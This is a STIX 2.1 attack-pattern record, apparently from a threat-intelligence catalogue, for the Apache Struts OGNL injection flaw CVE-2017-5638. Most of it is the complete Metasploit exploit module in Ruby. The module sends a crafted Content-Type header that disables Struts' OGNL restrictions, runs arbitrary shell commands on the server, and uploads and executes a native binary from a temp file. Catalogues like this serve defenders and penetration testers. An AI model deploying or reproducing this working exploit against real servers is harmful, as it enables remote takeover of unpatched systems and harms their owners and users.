{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--87d702a6-3658-4f7f-a0ae-90a70771b213",
    "created": "2024-08-14T17:09:19.878578Z",
    "modified": "2024-08-14T17:09:19.878582Z",
    "name": "Apache Struts Jakarta Multipart Parser OGNL Injection",
    "description": " This module exploits a remote code execution vulnerability in Apache Struts version 2.3.5 - 2.3.31, and 2.5 - 2.5.10. Remote Code Execution can be performed via http Content-Type header.  Native payloads will be converted to executables and dropped in the server's temp dir. If this fails, try a cmd/* payload, which won't have to write to the disk. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/struts2_content_type_ognl.rb",
            "external_id": "struts2_content_type_ognl.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-5638"
        },
        {
            "source_name": "reference",
            "url": "https://cwiki.apache.org/confluence/display/WW/S2-045"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apache Struts Jakarta Multipart Parser OGNL Injection',\n      'Description'    => %q{\n        This module exploits a remote code execution vulnerability in Apache Struts\n        version 2.3.5 - 2.3.31, and 2.5 - 2.5.10. Remote Code Execution can be performed\n        via http Content-Type header.\n\n        Native payloads will be converted to executables and dropped in the\n        server's temp dir. If this fails, try a cmd/* payload, which won't\n        have to write to the disk.\n      },\n      'Author'         => [\n        'Nike.Zheng', # PoC\n        'Nixawk',     # Metasploit module\n        'Chorder',    # Metasploit module\n        'egypt',      # combining the above\n        'Jeffrey Martin', # Java fu\n      ],\n      'References'     => [\n        ['CVE', '2017-5638'],\n        ['URL', 'https://cwiki.apache.org/confluence/display/WW/S2-045']\n      ],\n      'Privileged'     => true,\n      'Targets'        => [\n        [\n          'Universal', {\n            'Platform'   => %w{ unix windows linux },\n            'Arch'       => [ ARCH_CMD, ARCH_X86, ARCH_X64 ],\n          },\n        ],\n      ],\n      'DisclosureDate' => '2017-03-07',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          Opt::RPORT(8080),\n          OptString.new('TARGETURI', [ true, 'The path to a struts application action', '/struts2-showcase/' ]),\n        ]\n      )\n      register_advanced_options(\n        [\n          OptString.new('HTTPMethod', [ true, 'The HTTP method to send in the request. Cannot contain spaces', 'GET' ])\n        ]\n      )\n\n    @data_header = \"X-#{rand_text_alpha(4)}\"\n  end\n\n  def check\n    var_a = rand_text_alpha_lower(4)\n\n    ognl = \"\"\n    ognl << %q|(#os=@java.lang.System@getProperty('os.name')).|\n    ognl << %q|(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('|+var_a+%q|', #os))|\n\n    begin\n      resp = send_struts_request(ognl)\n    rescue Msf::Exploit::Failed\n      return Exploit::CheckCode::Unknown\n    end\n\n    if resp && resp.headers && resp.headers[var_a]\n      vprint_good(\"Victim operating system: #{resp.headers[var_a]}\")\n      Exploit::CheckCode::Vulnerable\n    else\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    case payload.arch.first\n    #when ARCH_JAVA\n    #  datastore['LHOST'] = nil\n    #  resp = send_payload(payload.encoded_jar)\n    when ARCH_CMD\n      resp = execute_command(payload.encoded)\n    else\n      resp = send_payload(generate_payload_exe)\n    end\n  end\n\n  def send_struts_request(ognl, extra_header: '')\n    uri = normalize_uri(datastore[\"TARGETURI\"])\n    content_type = \"%{(#_='multipart/form-data').\"\n    content_type << \"(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).\"\n    content_type << \"(#_memberAccess?\"\n    content_type << \"(#_memberAccess=#dm):\"\n    content_type << \"((#container=#context['com.opensymphony.xwork2.ActionContext.container']).\"\n    content_type << \"(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).\"\n    content_type << \"(#ognlUtil.getExcludedPackageNames().clear()).\"\n    content_type << \"(#ognlUtil.getExcludedClasses().clear()).\"\n    content_type << \"(#context.setMemberAccess(#dm)))).\"\n    content_type << ognl\n    content_type << \"}\"\n\n    headers = { 'Content-Type' => content_type }\n    if extra_header\n      headers[@data_header] = extra_header\n    end\n\n    #puts content_type.gsub(\").\", \").\\n\")\n    #puts\n\n    resp = send_request_cgi(\n      'uri'     => uri,\n      'method'  => datastore['HTTPMethod'],\n      'headers' => headers\n    )\n\n    if resp && resp.code == 404\n      fail_with(Failure::BadConfig, 'Server returned HTTP 404, please double check TARGETURI')\n    end\n    resp\n  end\n\n  def execute_command(cmd)\n    ognl = ''\n    ognl << %Q|(#cmd=@org.apache.struts2.ServletActionContext@getRequest().getHeader('#{@data_header}')).|\n\n    # You can add headers to the server's response for debugging with this:\n    #ognl << %q|(#r=#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']).|\n    #ognl << %q|(#r.addHeader('decoded',#cmd)).|\n\n    ognl << %q|(#os=@java.lang.System@getProperty('os.name')).|\n    ognl << %q|(#cmds=(#os.toLowerCase().contains('win')?{'cmd.exe','/c',#cmd}:{'/bin/sh','-c',#cmd})).|\n    ognl << %q|(#p=new java.lang.ProcessBuilder(#cmds)).|\n    ognl << %q|(#p.redirectErrorStream(true)).|\n    ognl << %q|(#process=#p.start())|\n\n    send_struts_request(ognl, extra_header: cmd)\n  end\n\n  def send_payload(exe)\n\n    ognl = \"\"\n    ognl << %Q|(#data=@org.apache.struts2.ServletActionContext@getRequest().getHeader('#{@data_header}')).|\n    ognl << %Q|(#f=@java.io.File@createTempFile('#{rand_text_alpha(4)}','.exe')).|\n    #ognl << %q|(#r=#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']).|\n    #ognl << %q|(#r.addHeader('file',#f.getAbsolutePath())).|\n    ognl << %q|(#f.setExecutable(true)).|\n    ognl << %q|(#f.deleteOnExit()).|\n    ognl << %q|(#fos=new java.io.FileOutputStream(#f)).|\n\n    # Using stuff from the sun.* package here means it likely won't work on\n    # non-Oracle JVMs, but the b64 decoder in Apache Commons doesn't seem to\n    # work and I don't see a better way of getting binary data onto the\n    # system. =/\n    ognl << %q|(#d=new sun.misc.BASE64Decoder().decodeBuffer(#data)).|\n    ognl << %q|(#fos.write(#d)).|\n    ognl << %q|(#fos.close()).|\n\n    ognl << %q|(#p=new java.lang.ProcessBuilder({#f.getAbsolutePath()})).|\n    ognl << %q|(#p.start()).|\n    ognl << %q|(#f.delete())|\n\n    send_struts_request(ognl, extra_header: [exe].pack(\"m\").delete(\"\\n\"))\n  end\nend\n\n=begin\nDoesn't work:\n\n    ognl << %q|(#cl=new java.net.URLClassLoader(new java.net.URL[]{#f.toURI().toURL()})).|\n    ognl << %q|(#c=#cl.loadClass('metasploit.Payload')).|\n    ognl << %q|(#m=@ognl.OgnlRuntime@getMethods(#c,'main',true).get(0)).|\n    ognl << %q|(#r.addHeader('meth',#m.toGenericString())).|\n    ognl << %q|(#m.invoke(null,null)).|\n\n    #ognl << %q|(#m=#c.getMethod('run',@java.lang.Class@forName('java.lang.Object'))).| # java.lang.IllegalArgumentException: java.lang.ClassCastException@58ce5ef0\n    #ognl << %q|(#m=#c.getMethod('run',@java.lang.Class@forName('java.lang.String'))).| # java.lang.IllegalArgumentException: java.lang.ClassCastException@58ce5ef0\n    #ognl << %q|(#m=#c.getMethod('run',@java.lang.Class@forName('[Ljava.lang.Object;'))).| # java.lang.IllegalArgumentException: java.lang.ClassCastException@58ce5ef0\n    #ognl << %q|(#m=#c.getMethod('run',@java.lang.Class@forName('[Ljava.lang.String;'))).| # java.lang.IllegalArgumentException: java.lang.ClassCastException@58ce5ef0\n    #ognl << %q|(#m=#c.getMethod('run',new java.lang.Class[]{})).|\n    #ognl << %q|(#m=#c.getMethod('run',new java.lang.Class[]{@java.lang.Class@forName('java.lang.Object')})).|\n    #ognl << %q|(#m=#c.getMethod('run',new java.lang.Class[]{@java.lang.Class@forName('java.lang.String')})).|\n    #ognl << %q|(#m=#c.getMethod('run',new java.lang.Class[]{@java.lang.Class@forName('java.lang.String')})).| # java.lang.IllegalArgumentException: java.lang.ClassCastException@16e2d926\n    #ognl << %q|(#m=#c.getMethod('run',new java.lang.Class[]{@java.lang.Class@forName('[Ljava.lang.Object;')})).|\n    #ognl << %q|(#m=#c.getMethod('run',new java.lang.Class[]{@java.lang.Class@forName('[Ljava.lang.String;')})).| # java.lang.IllegalArgumentException: java.lang.ClassCastException@684b3dfd\n    #ognl << %q|(#m=#c.getMethod('run',new java.lang.Class[]{null})).|\n    #ognl << %q|(#m=#c.getMethod('run',new java.lang.Object[]{@java.lang.Class@forName('java.lang.Object')})).|\n    #ognl << %q|(#m=#c.getMethod('run',new java.lang.Object[]{@java.lang.Class@forName('java.lang.String')})).| # java.lang.IllegalArgumentException: java.lang.ClassCastException@16e2d926\n    #ognl << %q|(#m=#c.getMethod('run',new java.lang.Object[]{@java.lang.Class@forName('[Ljava.lang.Object;')})).|\n    #ognl << %q|(#m=#c.getMethod('run',new java.lang.Object[]{@java.lang.Class@forName('[Ljava.lang.String;')})).| # java.lang.IllegalArgumentException: java.lang.ClassCastException@684b3dfd\n    #ognl << %q|(#m=#c.getMethod('run',new java.lang.Object[]{})).|      # java.lang.IllegalArgumentException: java.lang.ClassCastException@4b232ba9\n    #ognl << %q|(#m=#c.getMethod('run',new java.lang.Object[]{null})).|      # java.lang.IllegalArgumentException: java.lang.ClassCastException@4b232ba9\n    #ognl << %q|(#m=#c.getMethod('run',new java.lang.Object[]{null})).|  # java.lang.IllegalArgumentException: java.lang.ClassCastException@4fee2899\n    #ognl << %q|(#m=#c.getMethod('run',new java.lang.Object[])).|        # parse failed\n    #ognl << %q|(#m=#c.getMethod('run',null)).|                          # java.lang.IllegalArgumentException: java.lang.ClassCastException@50af0cd6\n\n    #ognl << %q|(#m=#c.getMethod('main',@java.lang.Class@forName('java.lang.Object'))).| # java.lang.IllegalArgumentException: java.lang.ClassCastException@58ce5ef0\n    #ognl << %q|(#m=#c.getMethod('main',@java.lang.Class@forName('java.lang.String'))).| # java.lang.IllegalArgumentException: java.lang.ClassCastException@58ce5ef0\n    #ognl << %q|(#m=#c.getMethod('main',@java.lang.Class@forName('[Ljava.lang.Object;'))).| # java.lang.IllegalArgumentException: java.lang.ClassCastException@58ce5ef0\n    #ognl << %q|(#m=#c.getMethod('main',@java.lang.Class@forName('[Ljava.lang.String;'))).| # java.lang.IllegalArgumentException: java.lang.ClassCastException@2231d3a9\n    #ognl << %q|(#m=#c.getMethod('main',new java.lang.Class[]{})).|\n    #ognl << %q|(#m=#c.getMethod('main',new java.lang.Class[]{@java.lang.Class@forName('java.lang.Object')})).|\n    #ognl << %q|(#m=#c.getMethod('main',new java.lang.Class[]{@java.lang.Class@forName('java.lang.String')})).|\n    #ognl << %q|(#m=#c.getMethod('main',new java.lang.Class[]{@java.lang.Class@forName('[Ljava.lang.Object;')})).|\n    #ognl << %q|(#m=#c.getMethod('main',new java.lang.Class[]{@java.lang.Class@forName('[Ljava.lang.String;')})).| # java.lang.IllegalArgumentException: java.lang.ClassCastException@684b3dfd\n    #ognl << %q|(#m=#c.getMethod('main',new java.lang.Class[]{null})).|\n    #ognl << %q|(#m=#c.getMethod('main',new java.lang.Object[]{@java.lang.Class@forName('java.lang.Object')})).|\n    #ognl << %q|(#m=#c.getMethod('main',new java.lang.Object[]{@java.lang.Class@forName('java.lang.String')})).| # java.lang.IllegalArgumentException: java.lang.ClassCastException@16e2d926\n    #ognl << %q|(#m=#c.getMethod('main',new java.lang.Object[]{@java.lang.Class@forName('[Ljava.lang.Object;')})).|\n    #ognl << %q|(#m=#c.getMethod('main',new java.lang.Object[]{@java.lang.Class@forName('[Ljava.lang.String;')})).| # java.lang.IllegalArgumentException: java.lang.ClassCastException@16e2d926\n    #ognl << %q|(#m=#c.getMethod('main',new java.lang.Object[]{})).|     # java.lang.IllegalArgumentException: java.lang.ClassCastException@5f78809f\n    #ognl << %q|(#m=#c.getMethod('main',new java.lang.Object[]{null})).|      # java.lang.IllegalArgumentException: java.lang.ClassCastException@4b232ba9\n    #ognl << %q|(#m=#c.getMethod('main',new java.lang.Object[]{null})).| # java.lang.IllegalArgumentException: java.lang.ClassCastException@56c6add5\n    #ognl << %q|(#m=#c.getMethod('main',new java.lang.Object[])).|       # parse failed\n    #ognl << %q|(#m=#c.getMethod('main',null)).|                         # java.lang.IllegalArgumentException: java.lang.ClassCastException@1722884\n\n=end\n",
    "x_mitre_disclosure_date": "2017-03-07",
    "x_mitre_platforms": [
        "%w{ unix windows linux }"
    ]
}